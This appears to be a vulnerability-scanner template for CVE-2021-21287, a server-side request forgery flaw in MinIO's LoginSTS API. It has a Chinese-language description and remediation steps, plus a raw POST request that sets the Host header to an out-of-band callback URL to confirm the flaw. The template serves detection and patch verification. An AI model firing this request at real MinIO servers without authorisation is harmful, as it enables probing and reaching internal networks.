id: CVE-2021-21287
info:
  name: MinIO Browser API SSRF
  author:
  - l0ne1y
  tags:
  - cve
  - cve2021
  - minio
  - ssrf
  - oast
  description: |-
    MinIO LoginSTS host SSRF 漏洞
    Minio是GlusterFS创始人之一Anand Babu Periasamy发布新的开源项目。 Minio可以做为云存储的解决方案用来保存海量的图片，视频，文档。

    Minio RELEASE.2021-01-30T00-20-58Z之前版本的LoginSTS API接口存在SSRF漏洞，攻击者通过控制host头部可造成SSRF漏洞。
  reference:
  - https://github.com/minio/minio/security/advisories/ghsa-m4qq-5f7c-693q
  - https://www.leavesongs.com/penetration/the-collision-of-containers-and-the-cloud-pentesting-a-minio.html
  - https://nvd.nist.gov/vuln/detail/cve-2021-21287
  - https://github.com/minio/minio/pull/11337
  severity: high
  classification:
    cve-id:
    - cve-2021-21287
    cwe-id:
    - cwe-918
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N
    cvss-score: 7.7
  remediation: |-
    官方修复方案：
    1、目前厂商已发布升级补丁以修复漏洞，补丁获取链接：https://github.com/minio/minio/releases/tag/RELEASE.2021-01-30T00-20-58Z

    临时修复方案：
    1、过滤内网服务器对公网服务器请求的响应。如果Web应用是获取某一类型的文件，在把返回结果展示给用户之前应先验证返回的信息是否符合文件类型标准，比如返回信息应为图片，如果返回信息是HTML，则停止将返回信息返回客户端。
    2、统一错误提示信息，避免用户可以根据错误信息来判断远端服务器的端口状态。
    3、在内网服务器的防火墙上限制公网服务器的请求端口为HTTP等协议常用端口，如：80、443、8080、8090。
    4、若公网服务器的内网IP与内网无业务通信，建议将公网服务器对应的内网IP列入黑名单，避免应用被用来获取内网数据。
    5、内网服务器禁用不必要的协议，仅允许HTTP和HTTPS请求，防止类似于file:///、gopher://、ftp:// 等协议引起的安全问题。
requests:
- matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
  - type: word
    words:
    - We encountered an internal error
  matchers-condition: and
  raw:
  - |
    POST /minio/webrpc HTTP/1.1
    Host: {{interactsh-url}}
    Content-Type: application/json
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36
    Content-Length: 76

    {"id":1,"jsonrpc":"2.0","params":{"token":  "Test"},"method":"web.LoginSTS"}
